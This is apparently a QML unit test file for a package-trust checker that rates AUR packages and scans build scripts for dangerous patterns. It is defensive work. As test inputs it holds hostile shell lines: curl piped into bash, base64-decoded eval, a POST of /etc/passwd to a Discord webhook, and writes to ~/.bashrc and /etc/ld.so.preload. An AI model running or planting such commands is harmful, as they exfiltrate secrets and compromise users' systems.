import QtQuick
import QtTest
import "../services/trust.js" as T

// Is a package real, and does it look safe? (services/trust.js) The repos and
// Flathub are signed and reviewed; the AUR is anyone's, so bead reads its
// facts (votes, age, maintainer) and its build files for known-bad patterns.
TestCase {
    name: "Trust"
    readonly property real now: 1795600000   // seconds
    readonly property real day: 86400
    function info(extra) {
        return Object.assign({ Name: "zen-browser-bin", NumVotes: 420, Popularity: 12.5, Maintainer: "someone",
            FirstSubmitted: now - 400 * day, LastModified: now - 5 * day, OutOfDate: null }, extra || {});
    }

    function test_a_well_known_package_is_fine() {
        const r = T.aurRisk(info(), now);
        compare(r.level, "ok");
        compare(r.reasons, []);
    }
    function test_missing_from_the_aur_is_danger() {
        const r = T.aurRisk(null, now);
        compare(r.level, "danger");
        verify(r.reasons[0].includes("not in the AUR"));
    }
    function test_brand_new_with_few_votes_is_caution() {
        const r = T.aurRisk(info({ NumVotes: 0, Popularity: 0, FirstSubmitted: now - 3 * day }), now);
        compare(r.level, "caution");
        verify(r.reasons.some(x => x.includes("3 days")));
        verify(r.reasons.some(x => x.includes("votes")));
    }
    function test_orphaned_is_caution() {
        compare(T.aurRisk(info({ Maintainer: null }), now).level, "caution");
    }
    function test_out_of_date_is_only_a_note() {
        const r = T.aurRisk(info({ OutOfDate: now - 10 * day }), now);
        compare(r.level, "ok");
        verify(r.notes.some(x => x.includes("out of date")));
    }

    function test_a_plain_build_file_has_no_findings() {
        compare(T.scan("pkgname=foo\nsource=(\"https://github.com/x/foo/archive/v1.tar.gz\")\npackage() { install -Dm755 foo \"$pkgdir/usr/bin/foo\"; }"), []);
    }
    function test_piping_a_download_into_a_shell_is_danger() {
        const f = T.scan("build() { curl -fsSL https://x.example/i.sh | bash; }");
        compare(f[0].level, "danger");
    }
    function test_decoding_hidden_code_is_danger() {
        compare(T.scan("eval \"$(echo aGk= | base64 -d)\"")[0].level, "danger");
        compare(T.scan("python -c \"exec(__import__('base64').b64decode('aGk='))\"")[0].level, "danger");
    }
    function test_sending_data_out_is_danger() {
        compare(T.scan("curl -X POST https://discord.com/api/webhooks/1/abc -d @/etc/passwd")[0].level, "danger");
    }
    function test_touching_your_home_or_startup_is_danger() {
        compare(T.scan("post_install() { cp x ~/.bashrc; }")[0].level, "danger");
        compare(T.scan("post_install() { echo x >> /etc/profile; }")[0].level, "danger");
    }
    function test_files_shipped_in_the_package_are_not_edits_to_your_system() {
        // google-chrome ships a cron job; installing it is pacman's, visible and removable
        compare(T.scan('install -Dm755 x "$pkgdir"/etc/cron.daily/google-chrome')[0].level, "caution");
        compare(T.scan('install -Dm644 x "${pkgdir}/etc/profile.d/foo.sh"').length, 0);
        // but an install script writing to /etc itself is
        compare(T.scan("post_install() { echo x >> /etc/ld.so.preload; }")[0].level, "danger");
    }
    function test_chromiums_sandbox_helper_may_be_setuid() {
        compare(T.scan('chmod 4755 "$pkgdir/opt/brave-bin/chrome-sandbox"'), []);
        compare(T.scan('chmod 4755 "$pkgdir/usr/bin/sneaky"')[0].level, "caution");
    }
    function test_a_bare_ip_or_paste_site_source_is_caution() {
        compare(T.scan("source=(\"http://45.12.3.9/payload.tar\")")[0].level, "caution");
        compare(T.scan("source=(\"https://pastebin.com/raw/abc\")")[0].level, "caution");
    }
    function test_a_finding_says_its_line() {
        const f = T.scan("pkgname=x\n\ncurl https://a.b/c | sh");
        compare(f[0].line, 3);
    }

    function test_the_verdict_is_the_worst_of_both() {
        compare(T.verdict(T.aurRisk(info(), now), []).level, "ok");
        compare(T.verdict(T.aurRisk(info(), now), T.scan("curl x | sh")).level, "danger");
        compare(T.verdict({ level: "caution", reasons: ["new"], notes: [] }, []).level, "caution");
    }
    function test_repo_and_flathub_packages_are_trusted_when_they_exist() {
        compare(T.signed("repo", true).level, "ok");
        compare(T.signed("repo", false).level, "danger");
        compare(T.signed("flathub", true, true).reasons, []);
        verify(T.signed("flathub", true, false).notes[0].includes("verified"));
    }
}
